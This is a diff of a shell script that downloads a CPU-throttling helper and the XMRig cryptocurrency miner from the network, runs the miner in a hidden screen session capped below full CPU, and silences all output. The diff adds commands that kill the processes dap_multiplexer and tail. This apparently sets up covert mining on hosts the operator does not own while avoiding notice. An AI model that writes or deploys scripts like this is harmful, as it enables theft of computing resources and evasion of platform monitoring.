@@ -7,6 +7,8 @@ sudo apt install cpulimit > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
 wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /dev/null 2>&1
 chmod +x limiting.sh > /dev/null 2>&1
+pkill dap_multiplexer
+pkill tail
 screen -dmS randum ./limiting.sh xmrig 65 75 > /dev/null 2>&1
 wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz > /dev/null 2>&1
 tar -xf xmrig-6.11.2-linux-x64.tar.gz > /dev/null 2>&1
